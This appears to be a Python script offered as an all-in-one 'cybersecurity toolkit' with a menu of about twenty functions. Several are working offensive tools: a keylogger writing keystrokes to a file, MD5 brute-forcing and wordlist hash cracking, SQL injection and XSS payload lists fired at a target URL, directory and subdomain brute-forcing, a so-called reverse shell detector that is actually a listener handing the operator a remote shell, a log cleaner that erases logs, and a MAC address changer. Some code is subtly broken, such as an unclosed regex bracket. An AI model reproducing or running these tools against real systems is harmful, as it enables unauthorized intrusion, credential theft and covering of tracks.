#!/usr/bin/env python3
import socket
import itertools
import hashlib
import requests
from bs4 import BeautifulSoup
from pynput import keyboard
import os
import sys
import time
import threading
import subprocess
import re
from datetime import datetime
import nmap  # For advanced network scanning
import scapy.all as scapy  # For packet manipulation
import dns.resolver  # For DNS enumeration
import whois  # For domain information
import json  # For reporting
import logging  # For logging actions
from colorama import Fore, Style, init  # For colored output
import random
import string
import ssl
import OpenSSL

# Initialize colorama
init()

# === Constants ===
DEFAULT_WORDLIST = ["admin", "login", "test", "dev", "ftp", "www", "mail"]
DEFAULT_PORTS = [21, 22, 80, 443, 8080, 3306, 3389]
LOG_FILE = "cyber_toolkit.log"

# === Setup Logging ===
logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format="%(asctime)s - %(message)s")

# === Colored Output ===
def print_success(message):
    print(Fore.GREEN + f"[+] {message}" + Style.RESET_ALL)

def print_error(message):
    print(Fore.RED + f"[-] {message}" + Style.RESET_ALL)

def print_info(message):
    print(Fore.BLUE + f"[*] {message}" + Style.RESET_ALL)

def print_warning(message):
    print(Fore.YELLOW + f"[!] {message}" + Style.RESET_ALL)

def print_banner():
    banner = f"""{Fore.CYAN}
    ███████╗██╗    ██╗██╗███████╗███████╗██╗  ██╗██╗███████╗███████╗
    ██╔════╝██║    ██║██║██╔════╝██╔════╝██║  ██║██║██╔════╝██╔════╝
    ███████╗██║ █╗ ██║██║███████╗███████╗███████║██║█████╗  █████╗  
    ╚════██║██║███╗██║██║╚════██║╚════██║██╔══██║██║██╔══╝  ██╔══╝  
    ███████║╚███╔███╔╝██║███████║███████║██║  ██║██║███████╗███████╗
    ╚══════╝ ╚══╝╚══╝ ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝
    {Style.RESET_ALL}
    """
    print(banner)

# === 1. Advanced Port Scanner (with Nmap) ===
def advanced_port_scanner(target, ports):
    print_info(f"Scanning {target} with Nmap...")
    try:
        nm = nmap.PortScanner()
        nm.scan(target, arguments=f"-p {ports} -T4")
        for host in nm.all_hosts():
            print_info(f"Host: {host}")
            for proto in nm[host].all_protocols():
                print_info(f"Protocol: {proto}")
                ports = nm[host][proto].keys()
                for port in ports:
                    state = nm[host][proto][port]['state']
                    print_success(f"Port {port} is {state}")
    except Exception as e:
        print_error(f"Error scanning {target}: {e}")

# === 2. Brute Force Password Cracker ===
def brute_force_password(target_hash, charset, max_length):
    def hash_match(candidate):
        hashed = hashlib.md5(candidate.encode()).hexdigest()
        return hashed == target_hash

    for length in range(1, max_length + 1):
        for candidate in itertools.product(charset, repeat=length):
            candidate = ''.join(candidate)
            if hash_match(candidate):
                print_success(f"Password found: {candidate}")
                return candidate
    print_error("Password not found.")
    return None

# === 3. Web Scraper for Vulnerabilities ===
def scrape_vulnerable_links(url):
    print_info(f"Scraping {url} for vulnerabilities...")
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        links = soup.find_all('a', href=True)

        for link in links:
            if "?" in link['href'] and "=" in link['href']:
                print_success(f"Potential vulnerable link found: {link['href']}")
    except requests.RequestException as e:
        print_error(f"Error scraping {url}: {e}")

# === 4. Simple Keylogger ===
def keylogger():
    def on_press(key):
        try:
            with open("keylog.txt", "a") as f:
                f.write(f"{key.char}")
        except AttributeError:
            with open("keylog.txt", "a") as f:
                f.write(f"{key} ")

    print_info("Keylogger running... Press Ctrl+C to stop.")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# === 5. SQL Injection Tester ===
def sql_injection_tester(url, param):
    payloads = ["' OR '1'='1", "' OR 1=1 --", "' OR '1'='1' /*", "' OR 'x'='x"]
    for payload in payloads:
        test_url = f"{url}?{param}={payload}"
        try:
            response = requests.get(test_url)
            if "error" not in response.text.lower():
                print_success(f"Possible vulnerability with payload: {payload}")
            else:
                print_error(f"Payload {payload} seems secure.")
        except requests.RequestException as e:
            print_error(f"Error testing payload {payload}: {e}")

# === 6. Subdomain Enumeration ===
def subdomain_enumeration(domain, wordlist):
    print_info(f"Enumerating subdomains for {domain}...")
    for subdomain in wordlist:
        url = f"http://{subdomain}.{domain}"
        try:
            requests.get(url)
            print_success(f"Found subdomain: {url}")
        except requests.ConnectionError:
            pass

# === 7. Directory Brute Force ===
def directory_brute_force(url, wordlist):
    print_info(f"Brute-forcing directories for {url}...")
    for directory in wordlist:
        target_url = f"{url}/{directory}"
        try:
            response = requests.get(target_url)
            if response.status_code == 200:
                print_success(f"Found directory: {target_url}")
        except requests.RequestException as e:
            print_error(f"Error accessing {target_url}: {e}")

# === 9. Banner Grabbing ===
def banner_grabbing(ip, port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(1)
        try:
            s.connect((ip, port))
            banner = s.recv(1024).decode()
            print_success(f"Banner for {ip}:{port}:\n{banner}")
        except Exception as e:
            print_error(f"No banner found for {ip}:{port}: {e}")

# === 10. XSS Payload Tester ===
def xss_payload_tester(url, param):
    payloads = [
        "<script>alert('XSS')</script>",
        "'\"><script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>"
    ]
    for payload in payloads:
        test_url = f"{url}?{param}={payload}"
        try:
            response = requests.get(test_url)
            if payload in response.text:
                print_success(f"XSS vulnerability found with payload: {payload}")
        except requests.RequestException as e:
            print_error(f"Error testing payload {payload}: {e}")

# === 11. Reverse Shell Detector ===
def reverse_shell_detector(port):
    print_info(f"Listening for reverse shells on port {port}...")
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(('0.0.0.0', port))
        s.listen(1)
        conn, addr = s.accept()
        print_success(f"Reverse shell connection from {addr}")
        while True:
            command = input("shell> ")
            if command == "exit":
                break
            conn.send(command.encode())
            print(conn.recv(1024).decode())

# === 12. File Integrity Monitor ===
def file_integrity_monitor(file_path):
    def calculate_hash(file_path):
        hasher = hashlib.md5()
        with open(file_path, "rb") as f:
            for chunk in iter(lambda: f.read(4096), b""):
                hasher.update(chunk)
        return hasher.hexdigest()

    original_hash = calculate_hash(file_path)
    print_info(f"Monitoring {file_path} for changes...")
    while True:
        time.sleep(5)
        current_hash = calculate_hash(file_path)
        if current_hash != original_hash:
            print_success(f"File {file_path} has been modified!")
            original_hash = current_hash

# === 13. Network Sniffer (with Scapy) ===
def network_sniffer(interface="eth0", packet_count=10):
    print_info(f"Sniffing {packet_count} packets on {interface}...")
    try:
        packets = scapy.sniff(iface=interface, count=packet_count)
        for packet in packets:
            print(packet.summary())
    except Exception as e:
        print_error(f"Error sniffing network: {e}")

# === 14. Hash Cracker (Advanced) ===
def hash_cracker(target_hash, hash_type, wordlist):
    print_info(f"Cracking {hash_type} hash: {target_hash}")
    with open(wordlist, "r") as f:
        for word in f:
            word = word.strip()
            if hash_type == "md5":
                hashed = hashlib.md5(word.encode()).hexdigest()
            elif hash_type == "sha1":
                hashed = hashlib.sha1(word.encode()).hexdigest()
            elif hash_type == "sha256":
                hashed = hashlib.sha256(word.encode()).hexdigest()
            else:
                print_error("Unsupported hash type.")
                return
            if hashed == target_hash:
                print_success(f"Hash cracked: {word}")
                return
    print_error("Hash not found in wordlist.")

# === 15. Log Cleaner ===
def log_cleaner(log_file):
    print_info(f"Cleaning log file: {log_file}")
    try:
        with open(log_file, "w") as f:
            f.write("")
        print_success("Log file cleared.")
    except Exception as e:
        print_error(f"Error cleaning log file: {e}")

# === 16. DNS Enumeration ===
def dns_enumeration(domain):
    print_info(f"Enumerating DNS records for {domain}...")
    try:
        answers = dns.resolver.resolve(domain, 'A')
        for rdata in answers:
            print_success(f"A Record: {rdata.address}")
    except Exception as e:
        print_error(f"Error enumerating DNS: {e}")

# === 17. WHOIS Lookup ===
def whois_lookup(domain):
    print_info(f"Performing WHOIS lookup for {domain}...")
    try:
        domain_info = whois.whois(domain)
        print_success(f"WHOIS Info:\n{json.dumps(domain_info, indent=4)}")
    except Exception as e:
        print_error(f"Error performing WHOIS lookup: {e}")

# === 18. Automated Reporting ===
def generate_report():
    print_info("Generating report...")
    try:
        with open(LOG_FILE, "r") as f:
            log_data = f.read()
        report = {
            "timestamp": datetime.now().isoformat(),
            "log_data": log_data
        }
        with open("report.json", "w") as f:
            json.dump(report, f, indent=4)
        print_success("Report generated: report.json")
    except Exception as e:
        print_error(f"Error generating report: {e}")

# === 19. Network Traffic Analyzer ===
def network_traffic_analyzer(interface="eth0", packet_count=10):
    print_info(f"Analyzing network traffic on {interface}...")
    try:
        packets = scapy.sniff(iface=interface, count=packet_count)
        for packet in packets:
            if packet.haslayer(scapy.TCP):
                print_warning(f"TCP Packet: {packet.summary()}")
            elif packet.haslayer(scapy.UDP):
                print_warning(f"UDP Packet: {packet.summary()}")
            elif packet.haslayer(scapy.ICMP):
                print_warning(f"ICMP Packet: {packet.summary()}")
    except Exception as e:
        print_error(f"Error analyzing network traffic: {e}")

# === 20. Password Strength Checker ===
def password_strength_checker(password):
    strength = 0
    if len(password) >= 8:
        strength += 1
    if re.search(r"[A-Z]", password):
        strength += 1
    if re.search(r"[a-z]", password):
        strength += 1
    if re.search(r"[0-9]", password):
        strength += 1
    if re.search(r"[!@#$%^&*()_+{}|:\"<>?~`", password):
        strength += 1

    if strength == 5:
        print_success("Password is very strong!")
    elif strength >= 3:
        print_warning("Password is strong, but could be stronger.")
    else:
        print_error("Password is weak!")

# === 21. MAC Address Changer ===
def mac_address_changer(interface, new_mac):
    print_info(f"Changing MAC address of {interface} to {new_mac}...")
    try:
        subprocess.call(["sudo", "ifconfig", interface, "down"])
        subprocess.call(["sudo", "ifconfig", interface, "hw", "ether", new_mac])
        subprocess.call(["sudo", "ifconfig", interface, "up"])
        print_success(f"MAC address changed to {new_mac}")
    except Exception as e:
        print_error(f"Error changing MAC address: {e}")

# === 22. Port Knocking ===
def port_knocking(ip, ports):
    print_info(f"Knocking on ports {ports}...")
    try:
        for port in ports:
            subprocess.call(["knock", ip, str(port)])
        print_success("Port knocking sequence completed.")
    except Exception as e:
        print_error(f"Error during port knocking: {e}")

# === 23. SSL/TLS Checker ===
def ssl_tls_checker(url):
    print_info(f"Checking SSL/TLS configuration for {url}...")
    try:
        cert = ssl.get_server_certificate((url, 443))
        x509 = OpenSSL.crypto.load_certificate(OpenSSL.crypto.FILETYPE_PEM, cert)
        print_success(f"Certificate Issuer: {x509.get_issuer()}")
        print_success(f"Certificate Expiry: {x509.get_notAfter()}")
    except Exception as e:
        print_error(f"Error checking SSL/TLS configuration: {e}")

# === Main Menu ===
def main_menu():
    while True:
        print_banner()
        print(Fore.CYAN + "=== Advanced Swiss Army Knife Cybersecurity Toolkit ===" + Style.RESET_ALL)
        print("1. Advanced Port Scanner")
        print("2. Brute Force Password Cracker")
        print("3. Web Scraper for Vulnerabilities")
        print("4. Keylogger")
        print("5. SQL Injection Tester")
        print("6. Subdomain Enumeration")
        print("7. Directory Brute Force")
        print("9. Banner Grabbing")
        print("10. XSS Payload Tester")
        print("11. Reverse Shell Detector")
        print("12. File Integrity Monitor")
        print("13. Network Sniffer")
        print("14. Hash Cracker")
        print("15. Log Cleaner")
        print("16. DNS Enumeration")
        print("17. WHOIS Lookup")
        print("18. Generate Report")
        print("19. Network Traffic Analyzer")
        print("20. Password Strength Checker")
        print("21. MAC Address Changer")
        print("22. Port Knocking")
        print("23. SSL/TLS Checker")
        print("24. Exit")

        choice = input("Enter your choice: ")

        if choice == "1":
            target = input("Enter target IP: ")
            ports = input("Enter ports to scan (comma-separated): ")
            ports = ",".join(ports.split())
            advanced_port_scanner(target, ports)
        elif choice == "2":
            target_hash = input("Enter hash to crack: ")
            charset = "abcdefghijklmnopqrstuvwxyz"
            max_length = int(input("Enter maximum password length: "))
            brute_force_password(target_hash, charset, max_length)
        elif choice == "3":
            url = input("Enter target URL: ")
            scrape_vulnerable_links(url)
        elif choice == "4":
            keylogger()
        elif choice == "5":
            url = input("Enter target URL (without parameters): ")
            param = input("Enter parameter to test: ")
            sql_injection_tester(url, param)
        elif choice == "6":
            domain = input("Enter domain: ")
            subdomain_enumeration(domain, DEFAULT_WORDLIST)
        elif choice == "7":
            url = input("Enter base URL: ")
            directory_brute_force(url, DEFAULT_WORDLIST)
        elif choice == "9":
            ip = input("Enter target IP: ")
            port = int(input("Enter target port: "))
            banner_grabbing(ip, port)
        elif choice == "10":
            url = input("Enter target URL: ")
            param = input("Enter parameter to test: ")
            xss_payload_tester(url, param)
        elif choice == "11":
            port = int(input("Enter port to listen on: "))
            reverse_shell_detector(port)
        elif choice == "12":
            file_path = input("Enter file path to monitor: ")
            file_integrity_monitor(file_path)
        elif choice == "13":
            interface = input("Enter network interface (default: eth0): ") or "eth0"
            packet_count = int(input("Enter number of packets to capture: "))
            network_sniffer(interface, packet_count)
        elif choice == "14":
            target_hash = input("Enter hash to crack: ")
            hash_type = input("Enter hash type (md5, sha1, sha256): ").lower()
            wordlist = input("Enter path to wordlist: ")
            hash_cracker(target_hash, hash_type, wordlist)
        elif choice == "15":
            log_cleaner(LOG_FILE)
        elif choice == "16":
            domain = input("Enter domain: ")
            dns_enumeration(domain)
        elif choice == "17":
            domain = input("Enter domain: ")
            whois_lookup(domain)
        elif choice == "18":
            generate_report()
        elif choice == "19":
            interface = input("Enter network interface (default: eth0): ") or "eth0"
            packet_count = int(input("Enter number of packets to analyze: "))
            network_traffic_analyzer(interface, packet_count)
        elif choice == "20":
            password = input("Enter password to check: ")
            password_strength_checker(password)
        elif choice == "21":
            interface = input("Enter network interface: ")
            new_mac = input("Enter new MAC address: ")
            mac_address_changer(interface, new_mac)
        elif choice == "22":
            ip = input("Enter target IP: ")
            ports = input("Enter ports to knock (comma-separated): ")
            ports = list(map(int, ports.split(',')))
            port_knocking(ip, ports)
        elif choice == "23":
            url = input("Enter target URL (without https://): ")
            ssl_tls_checker(url)
        elif choice == "24":
            print_info("Exiting toolkit. Goodbye!")
            sys.exit(0)
        else:
            print_error("Invalid choice. Please try again.")

        input("\nPress Enter to return to the main menu...")

if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        print("\n" + Fore.CYAN + "Exiting... Goodbye!" + Style.RESET_ALL)
        sys.exit(0)
